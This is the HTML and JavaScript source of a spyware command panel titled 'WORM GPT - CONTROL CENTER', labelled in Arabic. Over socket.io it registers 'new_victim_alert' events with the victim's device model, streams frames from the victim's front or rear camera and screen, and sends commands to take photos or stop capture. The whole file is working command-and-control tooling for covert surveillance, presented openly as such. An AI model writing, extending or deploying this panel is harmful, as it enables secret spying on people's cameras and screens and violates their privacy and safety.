<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WORM GPT - CONTROL CENTER</title>
    <style>
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            height: 100vh;
        }

        /* حاوية العرض المباشر */
        #monitor { 
            flex: 1; 
            background: #050505; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            position: relative;
            border-bottom: 2px solid #f00;
        }

        #liveImg { 
            max-height: 95%; 
            max-width: 95%; 
            object-fit: contain; 
        }

        .status-tag {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #0f0;
            padding: 5px 10px;
            font-size: 12px;
            border-radius: 4px;
        }

        /* حاوية الأزرار - التأكد من ظهورها بالأسفل */
        .controls { 
            height: auto; 
            min-height: 150px;
            background: #111; 
            display: grid;
            grid-template-columns: repeat(2, 1fr); /* زرين في كل صف */
            gap: 10px;
            padding: 15px;
            box-sizing: border-box;
        }

        button { 
            background: #f00; 
            color: #fff; 
            padding: 15px 5px; 
            border: none; 
            font-weight: bold; 
            cursor: pointer; 
            border-radius: 5px;
            font-size: 13px;
            transition: 0.3s;
        }

        button:active { background: #fff; color: #000; }

        .btn-full { grid-column: span 2; background: #444; } /* زر التحديث */
    </style>
</head>
<body>

    <div id="monitor">
        <div class="status-tag" id="stat">🔴 OFFLINE</div>
        <img id="liveImg" src="" alt="بانتظار البث...">
    </div>
    
    <div class="controls">
        <button onclick="send('start_camera_back')">📸 كاميرا خلفية</button>
        <button onclick="send('start_camera_front')">🤳 كاميرا أمامية</button>
        <button onclick="send('start_screen')">📱 بث الشاشة</button>
        <button onclick="send('take_photo')">🖼️ التقاط صورة</button>
        <button onclick="send('stop_all')" style="background: #900;">🛑 إيقاف الكل</button>
        <button onclick="location.reload()" class="btn-full">🔄 تحديث الصفحة</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const img = document.getElementById('liveImg');
        const stat = document.getElementById('stat');

        socket.on('new_victim_alert', d => {
            stat.innerText = "🟢 ONLINE: " + d.model;
            stat.style.color = "#0f0";
            stat.style.borderColor = "#0f0";
        });

        socket.on('display_frame', d => {
            img.src = "data:image/jpeg;base64," + d.frame;
        });

        socket.on('display_photo', d => {
            img.src = "data:image/jpeg;base64," + d.img;
            alert("تم استقبال الصورة!");
        });

        function send(cmd) {
            socket.emit('admin_command', { command: cmd });
        }
    </script>
</body>
</html>
